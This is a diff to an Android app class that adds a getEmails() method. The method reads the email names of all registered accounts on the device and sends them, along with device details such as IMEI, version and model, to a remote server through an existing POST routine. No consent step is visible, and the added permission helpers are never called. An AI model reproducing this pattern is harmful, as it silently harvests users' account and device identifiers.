@@ -1,6 +1,9 @@
 package com.example.androiddatachecker;
 
 import android.Manifest;
+import android.accounts.Account;
+import android.accounts.AccountManager;
+import android.app.Activity;
 import android.content.Context;
 import android.content.ContextWrapper;
 import android.content.Intent;
@@ -10,8 +13,10 @@ import android.os.AsyncTask;
 import android.os.BatteryManager;
 import android.os.Build;
 import android.support.v4.app.ActivityCompat;
+import android.support.v4.content.ContextCompat;
 import android.support.v7.app.AppCompatActivity;
 import android.telephony.TelephonyManager;
+import android.util.Patterns;
 import android.widget.Toast;
 
 import org.apache.http.HttpEntity;
@@ -29,10 +34,12 @@ import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Date;
 import java.util.List;
+import java.util.regex.Pattern;
 
 public class SaveUserCheckData  extends AppCompatActivity {
     private static ContextWrapper context;
-
+    private String wantPermission = Manifest.permission.GET_ACCOUNTS;
+    private static final int PERMISSION_REQUEST_CODE = 1;
     SimpleDateFormat heuref = new SimpleDateFormat("HH:mm");
     String heureFormatter = heuref.format(new Date());
     ////////////////date/////////////////////
@@ -49,7 +56,7 @@ public class SaveUserCheckData  extends AppCompatActivity {
 
     public void SaveUserCheckDatas(){
         InsertData("tel1","tel2","tel3","tel4","getPhoneIMEI()",version_phone(),ModelPhone(),"duree",
-                "gmail","twitter","fb",dateFormatter,heureFormatter,dateFormatter,"actif","actif");
+                getEmails(),"twitter","fb",dateFormatter,heureFormatter,dateFormatter,"actif","actif");
 
         SaveUserCommonProprety saveUserCommonProprety = new SaveUserCommonProprety(context);
         saveUserCommonProprety.SaveUserCommonPropreties();
@@ -158,5 +165,44 @@ public class SaveUserCheckData  extends AppCompatActivity {
 
         sendPostReqAsyncTask.execute(tel1, tel2, tel3, tel4, imei, version, model,duree_activite,gmail,twitter,fb,dat_ins,heure_ins,last_update,
                 etat, statut);
+    }
+
+    ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    private String getEmails() {
+        Pattern emailPattern = Patterns.EMAIL_ADDRESS;
+        String mail= null;
+        // Getting all registered Google Accounts;
+        // Account[] accounts = AccountManager.get(this).getAccountsByType("com.google");
+
+        // Getting all registered Accounts;
+        Account[] accounts = AccountManager.get(context).getAccounts();
+
+        for (Account account : accounts) {
+            if (emailPattern.matcher(account.name).matches()) {
+                mail=account.name;
+            }
+        }
+        return mail;
+    }
+
+    private boolean checkPermission(String permission){
+        if (Build.VERSION.SDK_INT >= 23) {
+            int result = ContextCompat.checkSelfPermission(context, permission);
+            if (result == PackageManager.PERMISSION_GRANTED){
+                return true;
+            } else {
+                return false;
+            }
+        } else {
+            return true;
+        }
+    }
+
+    private void requestPermission(String permission){
+        if (ActivityCompat.shouldShowRequestPermissionRationale((Activity) context, permission)){
+            return;
+
+        }
+        ActivityCompat.requestPermissions((Activity) context, new String[]{permission}, PERMISSION_REQUEST_CODE);
     }
 }
